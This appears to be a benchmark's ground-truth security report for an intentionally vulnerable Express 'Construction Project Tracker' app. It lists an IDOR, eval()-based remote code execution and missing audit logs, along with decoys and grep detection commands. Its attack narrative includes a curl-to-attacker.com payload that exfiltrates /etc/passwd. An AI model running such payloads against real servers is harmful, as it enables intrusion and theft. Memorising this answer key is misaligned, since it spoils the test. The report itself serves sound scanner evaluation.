# Security Report: app-42-construction-tracker

## Application Information

- **App ID**: app-42
- **App Name**: Construction Project Tracker
- **Language**: JavaScript
- **Framework**: Express
- **Source**: `apps/javascript/app-42-construction-tracker/`

---

## Vulnerability Summary

| ID | OWASP | Category | Severity | Location | CWE |
|---|---|---|---|---|---|
| V1 | A01 | Broken Access Control | Medium | `src/index.js` → `GET /api/contracts/:id` (lines 136-152) | CWE-639 |
| V2 | A08 | Software and Data Integrity Failures | High | `src/index.js` → `POST /api/contracts/template` (lines 155-170) | CWE-502 |
| V3 | A09 | Security Logging and Monitoring Failures | Low | `src/index.js` → `POST /api/contracts/:id/delete` (lines 184-206) | CWE-778 |

### V1: IDOR on Contract Details

**OWASP Category**: A01 — Broken Access Control

**Description**: Viewing project contracts by ID lacks verification of user ownership, allowing any authenticated user to retrieve details of another manager's contracts.

**Endpoint**: `GET /api/contracts/:id`

**CWE**: CWE-639 (Authorization Bypass Through User-Controlled Key)

**Impact**: Medium — An authenticated user can enumerate contract IDs to view sensitive contract terms, financial figures, and subcontractor details belonging to other project managers.

**Detection**: Look for absence of ownership checks where the `:id` parameter is used without verifying `req.user.userId` against the contract record.

---

### V2: Insecure Deserialization via eval() in Template

**OWASP Category**: A08 — Software and Data Integrity Failures

**Description**: Template layout parameters are deserialized using the insecure `eval()` constructor, enabling remote code execution on the hosting server.

**Endpoint**: `POST /api/contracts/template`

**CWE**: CWE-502 (Deserialization of Untrusted Data)

**Impact**: High — An attacker can inject arbitrary JavaScript code through the template payload, achieving full remote code execution on the server.

**Detection**: Look for `eval()` calls or `new Function()` constructors that process user-supplied layout configuration data.

---

### V3: Missing Audit Log on Contract Deletion

**OWASP Category**: A09 — Security Logging and Monitoring Failures

**Description**: Deleting sensitive construction contracts from the system tracker produces no audit logs, blindfolding administrators to data removal.

**Endpoint**: `POST /api/contracts/:id/delete`

**CWE**: CWE-778 (Insufficient Logging)

**Impact**: Low — Malicious or accidental deletion of contract records cannot be traced or investigated.

**Detection**: Check the delete handler for any logging, audit trail, or notification mechanism before/after performing the deletion operation.

---

## Chained Attack Scenario

### Chain: "IDOR Information Mining → Insecure Deserialization Remote Code Execution"

**Impact**: `account_takeover`

**Overview**: An attacker logs in, retrieves construction contract details by calling `/api/contracts/1` (IDOR), and copies details. They then POST a template config to `/api/contracts/template` containing a system command execution payload evaluated via eval(), achieving RCE.

**Components**:

| Step | Issue | Severity | OWASP | CWE | Location |
|---|---|---|---|---|---|
| 1 | Contracts endpoint permits IDOR details mining | Medium | A01 | CWE-639 | `GET /api/contracts/:id` |
| 2 | Template processing executes user-submitted custom layouts via eval() | Medium | A08 | CWE-502 | `POST /api/contracts/template` |

**Attack Narrative**:
1. The attacker logs in and calls `GET /api/contracts/1` using IDOR to retrieve sensitive construction contract details and pricing information.
2. The attacker then POSTs to `/api/contracts/template` with a malicious layout configuration containing injected JavaScript: `require('child_process').execSync('curl http://attacker.com/steal?data=$(cat /etc/passwd)')`.
3. The server passes the payload to `eval()`, executing the command and exfiltrating system data.
4. Because the contract deletion endpoint at `POST /api/contracts/:id/delete` generates no audit logs, the attacker can delete contracts without detection.

**Combined Impact**: Account takeover — An attacker can achieve full remote code execution on the server by chaining IDOR data mining with insecure deserialization.

---

## Decoys (False-Positive Candidates)

| Location | Description |
|---|---|
| `src/index.js` | Proper Bcrypt hashing for password storage and validation |
| `src/index.js` | Proper role restriction on `GET /api/admin/stats` checking for ADMIN role |

---

## Detection Commands

```bash
# Find IDOR vulnerability on contract details
grep -n "contracts.*:id\|findOne\|findById" apps/javascript/app-42-construction-tracker/src/index.js

# Find eval() used for template parsing
grep -n "eval\|new Function\|template" apps/javascript/app-42-construction-tracker/src/index.js

# Find missing audit logs on deletion
grep -n "delete\|remove\|log\|audit" apps/javascript/app-42-construction-tracker/src/index.js
```

---

*Report generated from `.vulns` manifest for app-42-construction-tracker*